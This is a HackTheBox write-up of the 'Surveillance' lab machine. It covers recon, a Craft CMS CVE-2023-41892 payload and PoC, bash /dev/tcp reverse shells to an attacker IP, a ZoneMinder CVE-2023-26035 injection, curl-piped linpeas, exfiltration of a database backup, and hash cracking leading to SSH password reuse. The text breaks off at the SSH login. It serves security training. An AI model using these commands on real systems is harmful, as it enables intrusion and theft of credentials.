---
render_with_liquid: false
title: HackTheBox Writeup  Surveillance
date: 2023-12-13 22:52:36 +1400
tags: [hackthebox, nmap, linux, feroxbuster, craft-cms, cve-2023-41892, zoneminder, cve-2023-26035, socat, discover-backup, mysql, hashcat, password-reuse, sudo, perl-script]
---



Surveillance is a medium-difficulty Linux machine that showcases a vulnerability (`[CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892)`) in Craft CMS, which abuses PHP object injection to inject PHP content into the Craft CMS web log files to gain Remote Code Execution (RCE). The privilege escalation abuses ZoneMinder with an authenticated remote code injection in the `HostController.php` API endpoint to gain a shell as the `zoneminder` user. As this user, a `sudo` entry is abused by adding a configuration environment variable `LD_PRELOAD` via the admin panel and loading the malicious library file through `zmdc.dl` on the target, compromising the system.


# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance]
└─$ pt init '10.129.56.156 surveillance.htb'
+--------------+--------+---------------+------------------+
|   PROFILE    | STATUS |      IP       |      DOMAIN      |
+--------------+--------+---------------+------------------+
| surveillance | on     | 10.129.56.156 | surveillance.htb |
+--------------+--------+---------------+------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Dec 13 22:52:36 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 Surveillance.htb
Nmap scan report for Surveillance.htb (10.129.56.156)
Host is up, received user-set (0.24s latency).
Scanned at 2023-12-13 22:52:36 CST for 20s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 0B7345BDDB34DAEE691A08BF633AE076
|_http-title:  Surveillance
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Dec 13 22:52:56 2023 -- 1 IP address (1 host up) scanned in 20.03 seconds
```

## 80 - Site : Home Security


### Info

![](/assets/obsidian/41bc56669f099c754812189ce41714d3.png)

### Directory

> There's rate limit

```bash
feroxbuster -t 150 -o ferox_80.txt -k -u 'http://surveillance.htb' -w /usr/share/dirb/wordlists/common.txt -n
```

```ruby
200      GET        9l       26w      304c http://surveillance.htb/.htaccess
200      GET       46l       97w     1008c http://surveillance.htb/js/custom.js
200      GET      108l      201w     1870c http://surveillance.htb/css/responsive.css
200      GET       56l      237w    22629c http://surveillance.htb/images/w3.png
200      GET      109l      602w    50641c http://surveillance.htb/images/s1.png
200      GET      913l     1800w    17439c http://surveillance.htb/css/style.css
200      GET       42l      310w    32876c http://surveillance.htb/images/home.png
200      GET      195l      842w    69222c http://surveillance.htb/images/w1.png
200      GET      105l      782w    62695c http://surveillance.htb/images/w2.png
200      GET       42l      310w    32876c http://surveillance.htb/images/favicon.png
200      GET      114l      552w    42779c http://surveillance.htb/images/s2.png
200      GET        4l       66w    31000c http://surveillance.htb/css/font-awesome.min.css
200      GET       42l      243w    24617c http://surveillance.htb/images/s3.png
200      GET      148l      770w    71008c http://surveillance.htb/images/c2.jpg
200      GET      238l     1140w    90858c http://surveillance.htb/images/c1.jpg
200      GET       89l      964w    72118c http://surveillance.htb/images/hero-bg.png
200      GET        2l     1276w    88145c http://surveillance.htb/js/jquery-3.4.1.min.js
200      GET      783l     4077w   330169c http://surveillance.htb/images/about-img.png
200      GET    10038l    19587w   192348c http://surveillance.htb/css/bootstrap.css
200      GET     4436l    10973w   136569c http://surveillance.htb/js/bootstrap.js
200      GET      764l     3911w   284781c http://surveillance.htb/images/why-bg.jpg
200      GET     1518l     8174w   619758c http://surveillance.htb/images/slider-img.png
200      GET      475l     1185w    16230c http://surveillance.htb/
302      GET        0l        0w        0c http://surveillance.htb/admin => http://surveillance.htb/admin/login
301      GET        7l       12w      178c http://surveillance.htb/css => http://surveillance.htb/css/
301      GET        7l       12w      178c http://surveillance.htb/fonts => http://surveillance.htb/fonts/
301      GET        7l       12w      178c http://surveillance.htb/images => http://surveillance.htb/images/
301      GET        7l       12w      178c http://surveillance.htb/img => http://surveillance.htb/img/
200      GET        1l        0w        1c http://surveillance.htb/index
200      GET      475l     1185w    16230c http://surveillance.htb/index.php
301      GET        7l       12w      178c http://surveillance.htb/js => http://surveillance.htb/js/
302      GET        0l        0w        0c http://surveillance.htb/logout => http://surveillance.htb/
200      GET       27l       63w     1202c http://surveillance.htb/web.config
```

# User Flag
---

## Enumeration


### 80

At the bottom, it revealed **Craft CMS** with the version `4.4.14`

![](/assets/obsidian/8094cf817d9e96da3bab50d746936a75.png)


## Shell as www-data

### Craft CMS 4.4.14 Unauthenticated RCE (CVE-2023-41892)


#### Validate exploit

Google : `craft cms 4.4.14 exploit`

> https://security.snyk.io/vuln/SNYK-PHP-CRAFTCMSCMS-5901521

![](/assets/obsidian/012f98405c871f2819ab03cac05e998f.png)

By viewing the pull request for nuclei templates, we use the payload to check whether target is vulnerable

> https://github.com/projectdiscovery/nuclei-templates/pull/8215/files

![](/assets/obsidian/53c521e28c59489cbf2d14eda84d2bf2.png)

```http
POST / HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 238
Content-Type: application/x-www-form-urlencoded

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```

![](/assets/obsidian/24abf63116527d03648a0ad17559dd63.png)

#### Get reverse shell

Google : `CVE-2023-41892 poc`

> https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

> Since the poc uses burp suite as proxy, make sure to have **burpsuite** running, or just remove the code for proxy
{: .prompt-info }

Create the webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/exploit]
└─$ python CVE-2023-41892.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get interactive shell

> The machine has firewall enabled, needs port 443 or 80 for reverse shell
{: .prompt-warning }

```bash
$ /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/exploit]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.57.44] 39026
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web/cpresources$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<es$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@surveillance:~/html/craft/web/cpresources$ ^Z
zsh: suspended  nc -lvnp 443

┌──(bravosec㉿fsociety)-[~/htb/Surveillance/exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 443

www-data@surveillance:~/html/craft/web/cpresources$ export TERM=xterm
```

## From www-data to zoneminder


### Enumeration

Check users

```bash
www-data@surveillance:~/html/craft/web/cpresources$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
```

There's `.env` file in web root

```bash
www-data@surveillance:~/html/craft$ ls -latr
total 320
-rwxr-xr-x  1 www-data www-data    309 May 23  2023 craft
-rw-r--r--  1 www-data www-data    529 May 23  2023 bootstrap.php
-rw-r--r--  1 www-data www-data     31 May 23  2023 .gitignore
-rw-r--r--  1 www-data www-data    684 May 23  2023 .env.example.staging
-rw-r--r--  1 www-data www-data    688 May 23  2023 .env.example.production
-rw-r--r--  1 www-data www-data    678 May 23  2023 .env.example.dev
drwxr-xr-x 42 www-data www-data   4096 Jun 13  2023 vendor
-rw-r--r--  1 www-data www-data    622 Jun 13  2023 composer.json
-rw-r--r--  1 www-data www-data 261350 Jun 13  2023 composer.lock
drwxr-xr-x  4 www-data www-data   4096 Oct 11 17:57 config
drwxr-xr-x  6 www-data www-data   4096 Oct 11 20:12 storage
drwxr-xr-x  3 www-data www-data   4096 Oct 17 15:24 templates
drwxr-xr-x  3 root     root       4096 Oct 21 17:54 ..
drwxrwxr-x  2 www-data www-data   4096 Oct 21 18:26 migrations
-rw-r--r--  1 www-data www-data    836 Oct 21 18:32 .env
drwxr-xr-x  8 www-data www-data   4096 Oct 21 18:32 .
drwxr-xr-x  8 www-data www-data   4096 Dec 16 11:50 web

www-data@surveillance:~/html/craft$ cat .env

# Read about configuration, here:

# https://craftcms.com/docs/4.x/config/


# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7


# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production


# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_


# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=


# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

### Failed to crack admin hash from mysql database 

```sql
Welcome to the MariaDB monitor.  Commands end with ; or \g.raftCMSPassword2023!'
Your MariaDB connection id is 37164
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| craftdb            |
| information_schema |
+--------------------+
2 rows in set (0.003 sec)

MariaDB [(none)]> use craftdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [craftdb]> show tables;
+----------------------------+
| Tables_in_craftdb          |
+----------------------------+
| addresses                  |
| announcements              |
| assetindexdata             |
| assetindexingsessions      |
| assets                     |
| categories                 |
| categorygroups             |
| categorygroups_sites       |
| changedattributes          |
| changedfields              |
| content                    |
| craftidtokens              |
| deprecationerrors          |
| drafts                     |
| elements                   |
| elements_sites             |
| entries                    |
| entrytypes                 |
| fieldgroups                |
| fieldlayoutfields          |
| fieldlayouts               |
| fieldlayouttabs            |
| fields                     |
| globalsets                 |
| gqlschemas                 |
| gqltokens                  |
| imagetransformindex        |
| imagetransforms            |
| info                       |
| matrixblocks               |
| matrixblocks_owners        |
| matrixblocktypes           |
| migrations                 |
| plugins                    |
| projectconfig              |
| queue                      |
| relations                  |
| resourcepaths              |
| revisions                  |
| searchindex                |
| sections                   |
| sections_sites             |
| sequences                  |
| sessions                   |
| shunnedmessages            |
| sitegroups                 |
| sites                      |
| structureelements          |
| structures                 |
| systemmessages             |
| taggroups                  |
| tags                       |
| tokens                     |
| usergroups                 |
| usergroups_users           |
| userpermissions            |
| userpermissions_usergroups |
| userpermissions_users      |
| userpreferences            |
| users                      |
| volumefolders              |
| volumes                    |
| widgets                    |
+----------------------------+
63 rows in set (0.001 sec)

MariaDB [craftdb]> describe users;
+----------------------------+---------------------+------+-----+---------+-------+
| Field                      | Type                | Null | Key | Default | Extra |
+----------------------------+---------------------+------+-----+---------+-------+
| id                         | int(11)             | NO   | PRI | NULL    |       |
| photoId                    | int(11)             | YES  | MUL | NULL    |       |
| active                     | tinyint(1)          | NO   | MUL | 0       |       |
| pending                    | tinyint(1)          | NO   | MUL | 0       |       |
| locked                     | tinyint(1)          | NO   | MUL | 0       |       |
| suspended                  | tinyint(1)          | NO   | MUL | 0       |       |
| admin                      | tinyint(1)          | NO   |     | 0       |       |
| username                   | varchar(255)        | YES  | MUL | NULL    |       |
| fullName                   | varchar(255)        | YES  |     | NULL    |       |
| firstName                  | varchar(255)        | YES  |     | NULL    |       |
| lastName                   | varchar(255)        | YES  |     | NULL    |       |
| email                      | varchar(255)        | YES  | MUL | NULL    |       |
| password                   | varchar(255)        | YES  |     | NULL    |       |
| lastLoginDate              | datetime            | YES  |     | NULL    |       |
| lastLoginAttemptIp         | varchar(45)         | YES  |     | NULL    |       |
| invalidLoginWindowStart    | datetime            | YES  |     | NULL    |       |
| invalidLoginCount          | tinyint(3) unsigned | YES  |     | NULL    |       |
| lastInvalidLoginDate       | datetime            | YES  |     | NULL    |       |
| lockoutDate                | datetime            | YES  |     | NULL    |       |
| hasDashboard               | tinyint(1)          | NO   |     | 0       |       |
| verificationCode           | varchar(255)        | YES  | MUL | NULL    |       |
| verificationCodeIssuedDate | datetime            | YES  |     | NULL    |       |
| unverifiedEmail            | varchar(255)        | YES  |     | NULL    |       |
| passwordResetRequired      | tinyint(1)          | NO   |     | 0       |       |
| lastPasswordChangeDate     | datetime            | YES  |     | NULL    |       |
| dateCreated                | datetime            | NO   |     | NULL    |       |
| dateUpdated                | datetime            | NO   |     | NULL    |       |
+----------------------------+---------------------+------+-----+---------+-------+
27 rows in set (0.001 sec)

MariaDB [craftdb]> select id,active,suspended,admin,username,email,password from users;
+----+--------+-----------+-------+----------+------------------------+--------------------------------------------------------------+
| id | active | suspended | admin | username | email                  | password                                                     |
+----+--------+-----------+-------+----------+------------------------+--------------------------------------------------------------+
|  1 |      1 |         0 |     1 | admin    | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
+----+--------+-----------+-------+----------+------------------------+--------------------------------------------------------------+
```

The brypt hash wasn't cracked in 5 min, so I guess it's very likely a rabbit hole

```bash
hashcat mysql_craftdb_users.hash /opt/wordlists/rockyou.txt -m 3200
```

### Failed to crack admin hash from zoneminder database

**Zoneminder** is running on port `8080` at localhost

```bash
www-data@surveillance:~$ ss -ltnp
State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port            Process
LISTEN             0                  511                                127.0.0.1:8080                              0.0.0.0:*                users:(("nginx",pid=1027,fd=9),("nginx",pid=1026,fd=9))
LISTEN             0                  511                                  0.0.0.0:80                                0.0.0.0:*                users:(("nginx",pid=1027,fd=8),("nginx",pid=1026,fd=8))
LISTEN             0                  4096                           127.0.0.53%lo:53                                0.0.0.0:*
LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*
LISTEN             0                  80                                 127.0.0.1:3306                              0.0.0.0:*
LISTEN             0                  128                                     [::]:22                                   [::]:*
```

```bash
www-data@surveillance:~$ cat /etc/nginx/sites-enabled/zoneminder.conf
server {
    listen 127.0.0.1:8080;

    root /usr/share/zoneminder/www;

    index index.php;

    access_log /var/log/zm/access.log;
    error_log /var/log/zm/error.log;

    location / {
        try_files $uri $uri/ /index.php?$args =404;

        location ~ /api/(css|img|ico) {
            rewrite ^/api(.+)$ /api/app/webroot/$1 break;
            try_files $uri $uri/ =404;
        }

        location /api {
            rewrite ^/api(.+)$ /api/app/webroot/index.php?p=$1 last;
        }

        location /cgi-bin {
            include fastcgi_params;

            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";

            fastcgi_pass unix:/run/fcgiwrap.sock;
        }

        location ~ \.php$ {
            include fastcgi_params;

            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";

            fastcgi_index index.php;

            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock;
        }
    }
}
```

Found its database file

```bash
www-data@surveillance:/usr/share/zoneminder/www$ ls -latr
total 68
-rw-r--r--  1 root     zoneminder   29 Nov 18  2022 robots.txt
-rw-r--r--  1 root     zoneminder 9294 Nov 18  2022 index.php
drwxr-xr-x  4 www-data www-data   4096 Oct 17 10:53 ..
drwxr-xr-x  3 root     zoneminder 4096 Oct 17 10:53 skins
drwxr-xr-x  3 root     zoneminder 4096 Oct 17 10:57 ajax
drwxr-xr-x  4 root     zoneminder 4096 Oct 17 10:57 api
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 css
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 lang
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 js
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 graphics
drwxr-xr-x 13 root     zoneminder 4096 Oct 17 10:57 .
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 views
drwxr-xr-x  5 root     zoneminder 4096 Oct 17 10:57 vendor
drwxr-xr-x  2 root     zoneminder 4096 Oct 17 10:57 fonts
drwxr-xr-x  4 root     zoneminder 4096 Oct 17 12:59 includes
www-data@surveillance:/usr/share/zoneminder/www$ cd ..
www-data@surveillance:/usr/share/zoneminder$ ls -latr
total 48
drwxr-xr-x   4 www-data www-data    4096 Oct 17 10:53 .
drwxr-xr-x   2 root     zoneminder 36864 Oct 17 10:57 db
drwxr-xr-x  13 root     zoneminder  4096 Oct 17 10:57 www
drwxr-xr-x 151 root     root        4096 Nov  9 13:05 ..
www-data@surveillance:/usr/share/zoneminder$ cd db
www-data@surveillance:/usr/share/zoneminder/db$ ls -latr
total 1132
[...]
-rw-r--r-- 1 root     zoneminder    657 Nov 18  2022 zm_update-0.9.10.sql
-rw-r--r-- 1 root     zoneminder   3236 Nov 18  2022 zm_update-0.0.1.sql
-rw-r--r-- 1 root     zoneminder  10526 Nov 18  2022 triggers.sql
-rw-r--r-- 1 root     zoneminder   2655 Nov 23  2022 zm_update-1.35.24.sql
-rw-r--r-- 1 root     zoneminder    764 Nov 23  2022 zm_update-1.31.30.sql
-rw-r--r-- 1 root     zoneminder 234180 Nov 23  2022 zm_create.sql
drwxr-xr-x 4 www-data www-data     4096 Oct 17 10:53 ..
drwxr-xr-x 2 root     zoneminder  36864 Oct 17 10:57 .
```

Search for passwords

```bash
www-data@surveillance:/usr/share/zoneminder/db$ grep -rin admin
zm_update-1.24.2.sql:11:INSERT INTO `MonitorPresets` VALUES ('','ACTi TCM FFMPEG','Ffmpeg',NULL,NULL,NULL,NULL,NULL,'rtsp://admin:123456@<host/address>:7070',NULL,NULL,NULL,320,240,NULL,NULL,0,NULL,NULL,NULL,100,100);
zm_create.sql:794:-- Create a default admin user.
zm_create.sql:815:    'admin',
zm_create.sql:878:    1/*UserId = admin*/,
zm_create.sql:922:  1/*UserId=admin*/,
zm_create.sql:1020:INSERT INTO MonitorPresets VALUES (NULL,'Blue Net Video Server, jpeg','Remote','http',0,0,'http','simple','<ip-address>',80,'/cgi-bin/image.cgi?control=0&id=admin&passwd=admin',NULL,320,240,3,NULL,0,NULL,NULL,NULL,100,100);
zm_create.sql:1025:INSERT INTO MonitorPresets VALUES (NULL,'ACTi TCM FFMPEG','Ffmpeg',NULL,NULL,NULL,NULL,NULL,'rtsp://admin:123456@<host/address>:7070',NULL,NULL,NULL,320,240,NULL,NULL,0,NULL,NULL,NULL,100,100);
zm_create.sql:1043:INSERT INTO MonitorPresets VALUES (NULL,'Foscam FI8620 FFMPEG H.264','Ffmpeg',NULL,NULL,NULL,NULL,'','','','rtsp://<username>:<pwd>@<ip-address>:554/11',NULL,704,576,0,NULL,1,'10','<admin_pwd>','<ip-address>',100,100);
zm_create.sql:1044:INSERT INTO MonitorPresets VALUES (NULL,'Foscam FI8608W FFMPEG H.264','Ffmpeg',NULL,NULL,NULL,NULL,'','','','rtsp://<username>:<pwd>@<ip-address>:554/11',NULL,640,480,0,NULL,1,'11','<admin_pwd>','<ip-address>',100,100);
zm_create.sql:1045:INSERT INTO MonitorPresets VALUES (NULL,'Foscam FI9821W FFMPEG H.264','Ffmpeg',NULL,NULL,NULL,NULL,'','','','rtsp://<username>:<pwd>@<ip-address>:88/videoMain',NULL,1280,720,0,NULL,1,'12','<admin_pwd>','<ip-address>',100,100);
zm_create.sql:1296:INSERT INTO Config SET Id = 26, Name = 'ZM_SYSTEM_SHUTDOWN', Value = '0', Type = 'boolean', DefaultValue = 'no', Hint = 'yes|no', Pattern = '(?^i:^([yn]))', Format = ' ($1 =~ /^y/) ? \'yes\' : \'no\' ', Prompt = 'Allow Admin users to power off or restart the system from the ZoneMinder UI.', Help = 'The system will need to have sudo installed and the following added to /etc/sudoers~~
zm_create.sql:1918:      Allows the administrator to place an arbitrary text message
zm_update-0.9.12.sql:18:insert into Users values ('','admin',password('admin'),1,'View','Edit','Edit','Edit',NULL);
```

```bash
www-data@surveillance:/usr/share/zoneminder/db$ less zm_create.sql
```

![](/assets/obsidian/6bec905e95be932e8cce439c229e785b.png)

The `bcrypt` hash wasn't crackable

```bash
hashcat loot/mysql_zoneminder_users.hash -m 3200
```

### ZoneMinder Snapshots Command Injection (CVE-2023-26035)

Get the version of **zoneminder**

```bash
www-data@surveillance:/usr/share/zoneminder/www$ dpkg -s zoneminder | grep Version
Version: 1.36.32+dfsg1-1
```

Google : `zoneminder 1.36.32 exploit`

> https://attackerkb.com/topics/9s4YXM2Y4i/cve-2023-26035/vuln-details

![](/assets/obsidian/cda7d9266dbc85cb461f1e672ba776ee.png)

Get poc

> https://github.com/heapbytes/CVE-2023-26035

Forward `127.0.0.1:8080` to `0.0.0.0:8081` on target, since exploit needs to be run on attacker host

```bash
www-data@surveillance:/usr/share/zoneminder/www$ socat tcp-listen:8081,fork,reuseaddr tcp:127.0.0.1:8080
```

Run the exploit

```bash
git clone https://github.com/heapbytes/CVE-2023-26035
cd CVE-2023-26035
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/exploit/CVE-2023-26035]
└─$ python poc.py --target http://surveillance.htb:8081/ --cmd '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1"'
Fetching CSRF Token
Got Token: key:7b1583da4a0d13c1ed28822a2045a009a07a23fd,1702738984
[>] Sending payload..
[!] Script executed by out of time limit (if u used revshell, this will exit the script)
```

```bash
┌──(bravosec㉿fsociety)-[/tmp/CVE-2023-26035]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.57.44] 41720
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ww$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zoneminder@surveillance:/usr/share/zoneminder/www$ ^Z
zsh: suspended  nc -lvnp 443

┌──(bravosec㉿fsociety)-[/tmp/CVE-2023-26035]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 443

zoneminder@surveillance:/usr/share/zoneminder/www$
zoneminder@surveillance:/usr/share/zoneminder/www$ export TERM=xterm
zoneminder@surveillance:/usr/share/zoneminder/www$ id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

## From zoneminder to matthew


### Enumeration

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ cd ~
zoneminder@surveillance:~$ ls -latr
total 20
drwxr-xr-x 4 root       root       4096 Oct 17 11:20 ..
-rw-r--r-- 1 zoneminder zoneminder  220 Oct 17 11:20 .bash_logout
-rw-r--r-- 1 zoneminder zoneminder  807 Oct 17 11:20 .profile
-rw-r--r-- 1 zoneminder zoneminder 3771 Oct 17 11:20 .bashrc
lrwxrwxrwx 1 root       root          9 Nov  9 12:46 .bash_history -> /dev/null
drwxr-x--- 2 zoneminder zoneminder 4096 Nov  9 12:46 .
```

```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

There's a bunch of scripts that's able to run as root

```bash
zoneminder@surveillance:~$ ls -latr /usr/bin/zm[a-zA-Z]*.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
```

### Matthew's hash in Craft CMS backup file

Run **linpeas**

```bash
zoneminder@surveillance:~$ curl 10.10.16.30/linpeas.sh|bash
```

![](/assets/obsidian/af6ec6e5ff36062e75d2723ec7d75b59.png)

That backup file looks interesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance]
└─$ nc -lvnp 443 > loot/surveillance--2023-10-17-202801--v4.4.14.sql.zip
listening on [any] 443 ...
```

```bash
zoneminder@surveillance:~$ cat /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip > /dev/tcp/10.10.16.30/443
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ 7z l surveillance--2023-10-17-202801--v4.4.14.sql.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-10-18 04:33:08 .....       113365        19680  surveillance--2023-10-17-202801--v4.4.14.sql
------------------- ----- ------------ ------------  ------------------------
2023-10-18 04:33:08             113365        19680  1 files

┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ 7z x surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -i pass -E15
```

![](/assets/obsidian/adb53ec2b172d58b3d064a73601d3d9e.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ vi surveillance--2023-10-17-202801--v4.4.14.sql
```

Admin's name is `Matthew`, the only normal user on the machine!

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -i 'INSERT INTO `users`'
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

### Crack Matthew's hash

```bash
hashcat mysql_matthew.hash /opt/wordlists/rockyou.txt -m 1400
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance/loot]
└─$ hashcat mysql_matthew.hash /opt/wordlists/rockyou.txt -m 1400 --show
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```

### SSH as Matthew

Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance]
└─$ cssh matthew@surveillance.htb 'starcraft122490'
Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
